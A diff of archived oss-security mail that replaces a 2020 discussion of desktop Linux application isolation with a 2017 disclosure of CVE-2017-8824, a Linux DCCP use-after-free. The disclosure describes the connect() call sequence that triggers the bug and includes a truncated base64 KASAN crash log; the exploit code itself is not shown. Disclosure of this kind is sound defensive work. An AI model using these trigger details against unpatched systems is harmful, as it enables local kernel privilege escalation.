@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["14554" "Monday" "19" "October" "2020" "13:22:49" "+0200" "Solar Designer" "solar@openwall.com" "<20201019112249.GA14339@openwall.com>" "272" "Re: [oss-security] major changes if gnu/linux dominates the desktop and/or mobile market?" nil nil nil "10" "2020101911:22:49" "[oss-security] major changes if gnu/linux dominates the desktop and/or mobile market?" (number mark "U       solar@openwa Oct 19  272/14554 " thread-indent "\"Re: [oss-security] major changes if gnu/linux dominates the desktop and/or mobile market?\"\n") "<51adb874-f967-5cf7-ffff-a2b871a5455b@spamtrap.tnetconsulting.net>" ("<CAGUWgD_aZ6chnKWNf79_Ru=u=dFhMVX_qZEDv8tU1BajEx5ejw@mail.gmail.com>" "<20201005204820.GA8410@openwall.com>" "<51adb874-f967-5cf7-ffff-a2b871a5455b@spamtrap.tnetconsulting.net>") nil nil nil nil nil nil nil "Re: [oss-security] major changes if gnu/linux dominates the desktop and/or mobile market?" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["26990" "Tuesday" "5" "December" "2017" "00:11:41" "+0000" "Mohamed Ghannam" "simo.ghannam@gmail.com" "<CAP8jf_A2x6qceLjfJa6fHyDLQU4n9cdVm-Wc_V4awKy_zBQ66g@mail.gmail.com>" "528" "[oss-security] CVE-2017-8824 linux: use-after-free in DCCP code" nil nil nil "12" "2017120500:11:41" "[oss-security] CVE-2017-8824 linux: use-after-free in DCCP code" (number mark "U       simo.ghannam Dec  5  528/26990 " thread-indent "\"[oss-security] CVE-2017-8824 linux: use-after-free in DCCP code\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 15554 invoked by uid 550); 19 Oct 2020 11:25:01 -0000
+Received: (qmail 30052 invoked by uid 550); 5 Dec 2017 00:48:17 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,288 +12,565 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 13776 invoked from network); 19 Oct 2020 11:23:16 -0000
-Date: Mon, 19 Oct 2020 13:22:49 +0200
-From: Solar Designer <solar@openwall.com>
+Received: (qmail 1807 invoked from network); 5 Dec 2017 00:11:54 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=idZun1C0uaMVm8fEXggA28iXac9vLhmXSRiAFA8T6FM=;
+        b=laW/cdbIGLdWFO4Piy8xQvnLdBizYcLBOsSe9NYGHDPLiyOMdgN38Hr2yCN+X0NT9H
+         Cov2YehL/sVMsyToAUnDXa33x6dopyYPP4FluZOXf4i7XVIwRnh2n7VDgIRb1AZlZNY0
+         qFubPz3wYjsMe73g14d62Hz+pCoud+Jkw2tjWm8dlzoAkJgGcvyYbStTbzz8NzovBh/2
+         iLzInnU6uN6UIxRK+p3zxKRDeuX0zNf+Z2T2CSZAzyKtB5Hcj6pQt1lESXQKfvvSwy7K
+         HiQ7+GP6kpC2q24hFYHggI2ZYRcttrJKYBABqj+oNUL5rYmSPq8ETEXD8kY0mv4GDH9l
+         y5sQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=idZun1C0uaMVm8fEXggA28iXac9vLhmXSRiAFA8T6FM=;
+        b=C6ej+SesReSx1zRY9NYxS9ZxShuU0ex05cq3toP6jUxFMGiV/rWcWht1vvwX7EzPX8
+         Ncl5f+Gd+XN7lnp2s6KudRiNRiCyEjO+vwOP//dOA0KDSesurRq3h4eDMFIi7r1VnXr5
+         9GoZVGHbkHK06axRh3sbxPY/ZuA0TKHqnCFcu57HidP99NCS+2wXx9VIAt9XVrsP/rHD
+         8CCd44tR0mgO/8aQiN8m+Ke24anvNMlSWXiRrLAa5dLKru4i2uPQoftJ/QzrQDlsT32S
+         uNndtgKWlK2JpT9nC5OntJCBG+isvllqYlWv9JnjhwWJI1/RYzX4HkhAqFp4ABX6CECc
+         cUQw==
+X-Gm-Message-State: AKGB3mLK2dCov8eCBzqL9HcUni0NqMQ4TnGYl13IG29rYTXN/7XHpTve
+	y+yW/WNjITSw77OIUT1UNDVu4gLSF07pKGkYh5J/Ei3bMos=
+X-Google-Smtp-Source: AGs4zMZg04rVrQFu9KdkoL2fE6po258ikIfyfm5d3hfZu5BChczne0AkzZONKA5M9yIv6lq4LTddCI72PCe2amtGWZA=
+X-Received: by 10.233.230.1 with SMTP id z1mr21927066qkf.325.1512432701971;
+ Mon, 04 Dec 2017 16:11:41 -0800 (PST)
+MIME-Version: 1.0
+From: Mohamed Ghannam <simo.ghannam@gmail.com>
+Date: Tue, 5 Dec 2017 00:11:41 +0000
+Message-ID: <CAP8jf_A2x6qceLjfJa6fHyDLQU4n9cdVm-Wc_V4awKy_zBQ66g@mail.gmail.com>
 To: oss-security@lists.openwall.com
-Message-ID: <20201019112249.GA14339@openwall.com>
-References: <CAGUWgD_aZ6chnKWNf79_Ru=u=dFhMVX_qZEDv8tU1BajEx5ejw@mail.gmail.com> <20201005204820.GA8410@openwall.com> <51adb874-f967-5cf7-ffff-a2b871a5455b@spamtrap.tnetconsulting.net>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <51adb874-f967-5cf7-ffff-a2b871a5455b@spamtrap.tnetconsulting.net>
-User-Agent: Mutt/1.4.2.3i
-Subject: Re: [oss-security] major changes if gnu/linux dominates the desktop and/or mobile market?
+Content-Type: multipart/mixed; boundary="f403043b2478f365ad055f8cadf0"
+Subject: [oss-security] CVE-2017-8824 linux: use-after-free in DCCP code
+
+--f403043b2478f365ad055f8cadf0
+Content-Type: multipart/alternative; boundary="f403043b2478f365a9055f8cadee"
+
+--f403043b2478f365a9055f8cadee
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
 Hi,
 
-This is a belated combined reply to what several of you wrote.  I felt I
-had to at least address Grant's request for me to clarify what I meant.
 
-On Mon, Oct 05, 2020 at 03:53:26PM -0600, Grant Taylor wrote:
-> On 10/5/20 2:48 PM, Solar Designer wrote:
-> >On the desktop, major Linux distributions (and by the way *BSDs 
-> >and Solaris are not very different in this respect, I think) when 
-> >used as single-user desktop systems lack security isolation between 
-> >applications of the user.
-> 
-> I agree that there is a lot of room for improvement here.  But -- like 
-> you say -- I don't think this is isolated to Linux by any stretch of the 
-> imagination.  Unless I'm sorely mistaken, just about every contemporary 
-> desktop, and possibly server, operating system only gets as granular as 
-> the user level.
+This is an announcement for CVE-2017-8824 which is a use-after-free
+vulnerability
 
-Sure.  My mention of *BSDs and Solaris was in reference to other major
-Open Source operating systems.
+I found in Linux DCCP socket. It can be used to gain kernel code execution
+from unprivileged processes.
 
-> >(And also between the user and root, due to the typical recommended 
-> >use of sudo from the user account.)
-> 
-> Please elaborate what you mean here?
-> 
-> Are you commenting on the use of sudo (vs other access control 
-> mechanisms) or the seemingly default recommendation to allow members of 
-> the sudo group run any and all commands via sudo?  E.g.:
-> 
->    %group ALL=(ALL) NOPASSWD: ALL
 
-Neither.  Rather, I refer to the fundamentally flawed approach of
-elevating privileges from a user account that is also used for other
-purposes.  When doing so, you equate that account to the target
-(elevated) one.  Even if you have to enter a password (user's with sudo
-or root's with su, which doesn't make a difference) when you elevate
-privileges, you nevertheless expose the new privileged context and
-whatever you had to enter to reach it to other programs running as the
-user.  You also have no reliable way to know that you're entering this
-password to the intended program (such as sudo or su) rather than to
-something the possibly-already-compromised user context might have
-substituted in its place (e.g., a shell alias).
 
-So the typical "best practice" approach of logging in as a user and then
-sudo'ing or su'ing to root when needed is only good against mistakes and
-a subset of attacks, but doesn't provide any guarantee (even assuming
-perfect design and implementation of the system in all other aspects,
-and the user resisting social engineering to the best extent possible).
+You=E2=80=99ll find in attachment the proof of concept code and the kernel =
+panic
+log.
 
-So let's accept that the user account running the desktop environment is
-root-equivalent security-wise (is only different from root for safety,
-not security) as long as it's ever used to reach root.
 
-Then our next logical step is not to run programs that are not an
-essential part of the desktop environment as that same user account,
-with the only exception being for whatever is used for accessing the
-root account (and maybe other accounts) - e.g., there might be an option
-to open a terminal window where you'd use sudo, or maybe even open a
-root terminal right away (like Qubes OS has), maybe with password
-protection for safety and for some loose security against
-not-too-determined attackers with physical access to a live system
-(although Qubes OS doesn't bother with that).
 
-In other words, instead of having a seemingly unprivileged user account
-from which you occasionally elevate privileges, acknowledge that you
-actually have a privileged desktop user account from which you drop
-privileges to run most programs and from which you occasionally access
-root (without crossing a security boundary, but only a safety one).
+#######   BUG DETAILS  ############
 
-Unfortunately, programs allowed to talk to the same X server that the
-desktop environment uses are not really isolated from it.  We need to
-solve that.  (Qubes OS does so by running separate X servers in VMs, but
-the use of VMs is orthogonal to this.  Poor man's solutions such as
-limiting of X server features might also work, of course keeping the X
-server with all of its attack surface in the TCB, which us unfortunate.
-Then there's Wayland, which might also be part of a solution.)
 
-Finally, we need to integrate those programs on the same desktop and
-with ability to explicitly share files and clipboard.  (Qubes OS does
-this, too.  A poor man's alternative or an intermediate evolutionary
-step might be to run all programs other than the desktop environment as
-just one other user account.  This would address the issue of accessing
-root securely, but wouldn't yet provide isolation between the user's
-programs.)
 
-> >This kind of security isolation is something we have on Android, 
-> >but at the price of the user not having full access to (not entirely) 
-> >their device.  The user cannot even have e.g. a file manager app with 
-> >which they'd access all files of other apps.
-> 
-> I don't know anything about Android other than it made me mad the last 
-> time I tried to use it.
-> 
-> I have seen some recent references to user namespaces and sub-IDs.  I'm 
-> on the lookout for information to see if that might be a way to run 
-> different applications as their own sub-user-id and then behave 
-> similarly to how applications running as different users work.  Meaning 
-> that each application -> user ID would have it's own files and would 
-> then rely on being a member of another group to access other files.  All 
-> the while relying on file system permissions to protect other things.
-> 
-> Aside:  If you know of something that I should be reading, please point 
-> me towards it.
-> 
-> Have Firefox run as <username>-<firefox> and Evolution run as 
-> <username>-<evolution>.  Both user would appear as a different user than 
-> just <username> thereby enabling traditional user & group security 
-> models between applications run by the same user.
-> 
-> I don't know if I'm hallucinating or if something like this is possible, 
-> or even done somewhere that I'm not aware of.
+When a socket sock object is in DCCP_LISTEN  state and connect() system
+call is being called with AF_UNSPEC,
 
-On Android, each app you install gets its own pseudo-user like you
-describe.  An issue is then being able to access one app's files from
-another app when that is needed.  This is typically achieved by apps
-that sometimes need to share files requesting permission to access
-global shared storage such as "SD card" (which is often just a partition
-on the device's internal storage).  This is not perfect: permission is
-granted "just in case", not if and when access is needed, and it's not
-granular.  (I'm not familiar with how this might have been improved in
-recent Android, though.)
+the dccp_disconnect() puts sock state into DCCP_CLOSED, and forgets to free
+dccps_hc_rx_ccid/dccps_hc_tx_ccid and assigns NULL to them,
 
-On typical desktop systems, there's also the shared X server issue.
-(That said, I've been running a customized system like this for years.
-With my e-mail in Mutt, that one pseudo-user wasn't privileged to access
-the X server, so couldn't e.g. capture my SSH key passphrases.)
+then when we call connect() again with AF_INET6 sockaddr family, the sock
+object gets cloned via dccp_create_openreq_child() and returns a new sock
+object,
 
-> >For typical desktop Linux users, realistically most security is 
-> >provided by the web browser, which these days at least uses a 
-> >sandbox, protecting the user's files and other apps from itself. 
-> >That's something the underlying systems tend to lack.
-> 
-> I'm grateful that the web browser does do sandboxing.  But I don't think 
-> that we should need to rely on it for as much security as we do. 
+which holds references of dccps_hc_rx_ccid and dccps_hc_tx_ccid of the old
+sock object, and this leads to both the old and new sock objects can use
+the same memory.
 
-Of course, better not to rely on one layer of security.  I just point
-out that the state of desktop OS security is currently worse than the
-state of web browser security.
 
-> >Sure malware and social engineering are valid threats to keep in mind.
-> 
-> I don't see how the operating system / security infrastructure can be 
-> responsible for protecting people here.
 
-The OS should at least provide a means for a knowledgeable user to
-unambiguously determine where pop-up windows, prompts, etc. really come
-from.  (Such as Qubes OS coloring of window titles.)
+#######   LINKS  ############
 
-> >It's also a good idea not to rely solely on the browser's built-in 
-> >authorization checks, but to limit its access to system resources 
-> >such as the microphone and camera.  Qubes OS does that.
-> 
-> I naively think that some of this can be controlled with traditional 
-> file system permissions on the relevant device files.  If your (sub)user 
-> is not in the group to access the microphone -- guess what -- you don't 
-> get access to it.
 
-I'm afraid, there's typically no way at the device file level to grant
-access to audio output without also granting access to audio input.
-Maybe this needs to be introduced into the kernel.
 
-Besides, these days programs typically work through a server process
-such as pulseaudio.  In my example with having a dedicated pseudo-user
-account for the desktop environment, that one could also control whether
-audio input is enabled or disabled in the audio server, and the user's
-programs would need to be disallowed to control that.
+http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=3D2017-8824
 
-> >Relaxed file permissions like that may also further weaken some partial 
-> >sandboxes (when a service is running with its dedicated credentials, 
-> >but with retained filesystem access - such as because it needs that).
-> 
-> I want to agree with that.  But, with things ultimately running as the 
-> same user, then any subdivision therein is difficult to enforce.
+http://lists.openwall.net/netdev/2017/12/04/224
 
-I was referring e.g. to Postfix daemons, some of which run with full
-filesystem access yet as a (pseudo-)user that wouldn't be privileged to
-access a user's home directory if the home directory and files inside of
-it have stricter permissions than 755/644.
 
-On Mon, Oct 05, 2020 at 05:29:20PM -0400, Stephen John Smoogen wrote:
-> On Mon, 5 Oct 2020 at 16:49, Solar Designer <solar@openwall.com> wrote:
-> > On the desktop, major Linux distributions (and by the way *BSDs and
-> > Solaris are not very different in this respect, I think) when used as
-> > single-user desktop systems lack security isolation between applications
-> > of the user.  (And also between the user and root, due to the typical
-> > recommended use of sudo from the user account.)
-> 
-> I think it would take a lot of 'training' on why this is not wanted and
-> setting expectations about how one is supposed to use a computer without
-> that access.
 
-Yes, the most difficult part with securing a desktop system is to keep
-it conveniently usable.  I think it is possible to isolate the desktop
-environment from user programs without inconveniencing the user.  As to
-isolation between the user's programs, yes, that becomes visible to the
-user and would require some training on how to explicitly transfer data
-between the programs when needed.  Perhaps there are ways to make this
-intuitive, e.g. drag-and-drop.
+#######   CREDITS  ############
 
-> It is hard enough trying to explain to the person who wanted
-> everything containerized for 'better' security that allowing them to ssh
-> into the container so they can 'debug it' also removes the security that
-> they wanted.
 
-"Containerizing" things (at best) protects the outside from what's
-contained, not vice versa.  This is similar to the problem with sudo'ing
-or su'ing to root, and requires a similar solution.  This isn't hard for
-the user if access to containers is managed from a preconfigured desktop
-environment that's part of the TCB (like on Qubes OS), and that isn't
-used to run unrelated programs in the same security context.  The hard
-part is integration of the isolated environments and learning when and
-how to use it.
 
-> > Then there's the trend towards having a desktop-like Linux system on
-> > mobile devices again.  Before Android, we had e.g. Maemo and MeeGo.  Now
-> > we have e.g. Ubuntu Touch, postmarketOS, and Sailfish OS.  As far as I'm
-> > aware, so far this means lack of isolation between the apps just like we
-> > have on the desktop.
+Mohamed Ghannam
 
-BTW, there's a Russian security-hardened fork of Sailfish OS called
-Aurora.  I've skimmed and searched its user's manual (in Russian) for
-any mentions of isolation between the apps - found nothing, so I assume
-there's none.  (This isn't to say they haven't implemented any security
-changes - I think they have.  An interview I read with their CEO
-looked surprisingly reasonable.  However, it appears that addressing
-cross-app attacks is completely out of their focus.)
+--f403043b2478f365a9055f8cadee
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-> > We need the best of both worlds - isolation, yet full control.  I guess
-> > this could be achieved by devices gaining a physical button that would
-> > need to be pressed at the time a newly installed app is to be granted
-> > privileges by a component in the system's TCB.  Said component would
-> > also need to assure the user that it's the only one in control at the
-> > moment (kind of after a SAK) and that the displayed privileges request
-> > is truthful and complete, e.g. by lighting a dedicated LED.  You want to
-> > install an all-powerful file manager?  Just wait for that LED to light
-> > up, review what privileges would be granted to where, and press that
-> > button to accept.  Perhaps too cumbersome for typical users.  Maybe an
-> > alternative approach could be developed where a portion of the
-> > touchscreen (or a secondary one) would be reserved for interacting with
-> > the OS TCB.  Perhaps something like MacBook Pro's Touch Bar could be
-> > used for that purpose - and having that is already a precedent, it's
-> > just not used for a security purpose yet (or I haven't heard of that).
-> 
-> That would be useful and trusted if the touch bar has a direct path to the
-> TCB versus being able to be reprogrammed by the OS.
+<div dir=3D"ltr">
 
-Some components of the OS are normally part of the TCB (except in some
-other contexts).  Having dedicated screen space for control (like with
-Qubes OS preventing VMs' full screen mode by default) or indeed a
-dedicated screen is a reasonable security feature.  And yes, there's no
-security difference between dedicated screen space and dedicated screen
-when they're managed by the OS, but that's OK.
 
-On Mon, Oct 05, 2020 at 10:36:14PM -0400, Steve Grubb wrote:
-> I will skip the whole discussion on access control. However to prove security 
-> requires going through a Common Criteria certification. The biggest issue is 
-> that the desktoptop uses dbus instantiation which does not have the auid of 
-> the requesting process. Meaning audit cannot work.
-> 
-> The fix was kdus. That was rejected. But the issue remains. There cannot be a 
-> secure desktop without auditing. And no one is really pushing for a desktop 
-> certification, therefore no one is pushing to fix audit desktop problems.
 
-I think it's a bit ridiculous to talk about audit on the desktop when we
-haven't got the basics right.  A typical desktop system user won't know
-and won't benefit from audit, but would possibly benefit (ideally, not
-having to know about it!) from isolation of the desktop environment from
-other programs (e.g., as it relates to which programs can control the
-audio settings).
 
-Alexander
+
+
+
+
+
+
+
+
+
+
+
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">Hi,</span></p><p class=3D"gmail-MsoNormal" sty=
+le=3D"margin:0cm 0cm 0.0001pt;font-size:12pt;font-family:Calibri"><span lan=
+g=3D"EN-AU" style=3D"font-family:AppleSystemUIFont;color:rgb(53,53,53)"><br=
+></span></p><p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;f=
+ont-size:12pt;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-famil=
+y:AppleSystemUIFont;color:rgb(53,53,53)">This is an announcement
+for CVE-2017-8824 which is a use-after-free vulnerability<span></span></spa=
+n></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">I found in Linux DCCP
+socket. It can be used to gain kernel code execution from unprivileged
+processes.<span></span></span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">You=E2=80=99ll find in attachment
+the proof of concept code and the kernel panic log.<span></span></span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">#######=C2=A0=C2=A0 BUG DETAILS=C2=A0
+############<span></span></span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">When a socket sock object
+is in DCCP_LISTEN=C2=A0 state and connect() system call is being called with
+AF_UNSPEC, <span></span></span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">the dccp_disconnect()
+puts sock state into DCCP_CLOSED, and forgets to free
+dccps_hc_rx_ccid/dccps_hc_tx_ccid and assigns NULL to them,<span></span></s=
+pan></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">then when we call
+connect() again with AF_INET6 sockaddr family, the sock object gets cloned =
+via
+dccp_create_openreq_child() and returns a new sock object, <span></span></s=
+pan></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">which holds references of
+dccps_hc_rx_ccid and dccps_hc_tx_ccid of the old sock object, and this lead=
+s to both the old and new sock objects can use the same memory.</span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">#######=C2=A0=C2=A0 LINKS=C2=A0
+############<span></span></span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)"><a href=3D"http://www.cve.mitre.org/cgi-bin/cv=
+ename.cgi?name=3D2017-8824"><span style=3D"color:rgb(220,161,13);text-decor=
+ation-line:none">http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=3D2017-8=
+824</span></a><span></span></span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)"><a href=3D"http://lists.openwall.net/netdev/20=
+17/12/04/224"><span style=3D"color:rgb(220,161,13);text-decoration-line:non=
+e">http://lists.openwall.net/netdev/2017/12/04/224</span></a><span></span><=
+/span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">#######=C2=A0=C2=A0 CREDITS=C2=A0
+############<span></span></span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">=C2=A0</span></p>
+
+<p class=3D"gmail-MsoNormal" style=3D"margin:0cm 0cm 0.0001pt;font-size:12p=
+t;font-family:Calibri"><span lang=3D"EN-AU" style=3D"font-family:AppleSyste=
+mUIFont;color:rgb(53,53,53)">Mohamed Ghannam</span><span lang=3D"EN-AU"><sp=
+an></span></span></p>
+
+</div>
+
+--f403043b2478f365a9055f8cadee--
+
+--f403043b2478f365ad055f8cadf0
+Content-Type: application/octet-stream; name="kasan_report.log"
+Content-Disposition: attachment; filename="kasan_report.log"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_jasv7iup0
+
+WyAgIDg0LjkxMjk0N10gQlVHOiBLQVNBTjogdXNlLWFmdGVyLWZyZWUgaW4g
+Y2NpZF9oY19yeF9kZWxldGUrMHhkNS8weDEwMApbICAgODQuOTE0MTQyXSBS
+ZWFkIG9mIHNpemUgOCBhdCBhZGRyIGZmZmY4ODAwMzI1ZTcwMjAgYnkgdGFz
+ayBkY2NwLzI2OTYKWyAgIDg0LjkxNTM0OF0KWyAgIDg0LjkxNTY0N10gQ1BV
+OiAwIFBJRDogMjY5NiBDb21tOiBkY2NwIE5vdCB0YWludGVkIDQuMTIuMC1y
+YzMrICMyClsgICA4NC45MTY3NTldIEhhcmR3YXJlIG5hbWU6IFFFTVUgU3Rh
+bmRhcmQgUEMgKGk0NDBGWCArIFBJSVgsIDE5OTYpLCBCSU9TIFVidW50dS0x
+LjguMi0xdWJ1bnR1MSAwNC8wMS8yMDE0ClsgICA4NC45MTg0NjBdIENhbGwg
+VHJhY2U6ClsgICA4NC45MTg5NDJdICBkdW1wX3N0YWNrKzB4OTQvMHhlNApb
+ICAgODQuOTE5NTYwXSAgPyBjY2lkX2hjX3J4X2RlbGV0ZSsweGQ1LzB4MTAw
+ClsgICA4NC45MjAzMzNdICBwcmludF9hZGRyZXNzX2Rlc2NyaXB0aW9uKzB4
+NmIvMHgyODAKWyAgIDg0LjkyMTA2NV0gID8gY2NpZF9oY19yeF9kZWxldGUr
+MHhkNS8weDEwMApbICAgODQuOTIxNjgxXSAga2FzYW5fcmVwb3J0KzB4MjYw
+LzB4MzQwClsgICA4NC45MjIyMjddICBfX2FzYW5fcmVwb3J0X2xvYWQ4X25v
+YWJvcnQrMHgxNC8weDIwClsgICA4NC45MjMwMDVdICBjY2lkX2hjX3J4X2Rl
+bGV0ZSsweGQ1LzB4MTAwClsgICA4NC45MjM2MzBdICBkY2NwX2Rlc3Ryb3lf
+c29jaysweDFhNy8weDJiMApbICAgODQuOTI0MjI1XSAgZGNjcF92Nl9kZXN0
+cm95X3NvY2srMHgxNS8weDIwClsgICA4NC45MjQ4MzFdICBpbmV0X2Nza19k
+ZXN0cm95X3NvY2srMHgxNjYvMHg0MDAKWyAgIDg0LjkyNTQ3Nl0gIGRjY3Bf
+Y2xvc2UrMHgzZGUvMHhjNDAKWyAgIDg0LjkyNTk5MV0gID8gX19mc25vdGlm
+eV91cGRhdGVfY2hpbGRfZGVudHJ5X2ZsYWdzLnBhcnQuMisweDJjMC8weDJj
+MApbICAgODQuOTI2OTM1XSAgPyBpcF9tY19kcm9wX3NvY2tldCsweDFkZC8w
+eDI1MApbICAgODQuOTI3NTU3XSAgPyBzb2NrX3JlbGVhc2UrMHgyMDAvMHgy
+MDAKWyAgIDg0LjkyODExOF0gIGluZXRfcmVsZWFzZSsweGVkLzB4MWMwClsg
+ICA4NC45Mjg2NDJdICBpbmV0Nl9yZWxlYXNlKzB4NTAvMHg3MApbICAgODQu
+OTI5MTY1XSAgc29ja19yZWxlYXNlKzB4OGQvMHgyMDAKWyAgIDg0LjkyOTY4
+OF0gIHNvY2tfY2xvc2UrMHgxNi8weDIwClsgICA4NC45MzAxNzRdICBfX2Zw
+dXQrMHgyODkvMHg2ZjAKWyAgIDg0LjkzMDUyM10gIF9fX19mcHV0KzB4MTUv
+MHgyMApbICAgODQuOTMwODUzXSAgdGFza193b3JrX3J1bisweGY5LzB4MTcw
+ClsgICA4NC45MzEyNDNdICBleGl0X3RvX3VzZXJtb2RlX2xvb3ArMHgxM2Iv
+MHgxNjAKWyAgIDg0LjkzMTcwNV0gIHN5c2NhbGxfcmV0dXJuX3Nsb3dwYXRo
+KzB4MTZiLzB4MWEwClsgICA4NC45MzIxOTVdICBlbnRyeV9TWVNDQUxMXzY0
+X2Zhc3RwYXRoKzB4YWYvMHhiMQpbICAgODQuOTMyNjc0XSBSSVA6IDAwMzM6
+MHg0M2ZhODAKWyAgIDg0LjkzMjk5N10gUlNQOiAwMDJiOjAwMDA3ZmZkMzU4
+MTgwYzggRUZMQUdTOiAwMDAwMDI0NiBPUklHX1JBWDogMDAwMDAwMDAwMDAw
+MDAwMwpbICAgODQuOTMzNzYyXSBSQVg6IDAwMDAwMDAwMDAwMDAwMDAgUkJY
+OiAwMDAwMDAwMDAwNDAwMmM4IFJDWDogMDAwMDAwMDAwMDQzZmE4MApbICAg
+ODQuOTM0NDg2XSBSRFg6IDAwMDAwMDAwMDA2Y2Q1ZDAgUlNJOiAwMDAwMDAw
+MDAwMDAwMDBhIFJESTogMDAwMDAwMDAwMDAwMDAwNApbICAgODQuOTM1MjI2
+XSBSQlA6IDAwMDA3ZmZkMzU4MTg2YzAgUjA4OiAwMDAwMDAwMDAwNmNkNWMw
+IFIwOTogMDAwMDAwMDAwMGIzYzg4MApbICAgODQuOTM1OTUyXSBSMTA6IDAw
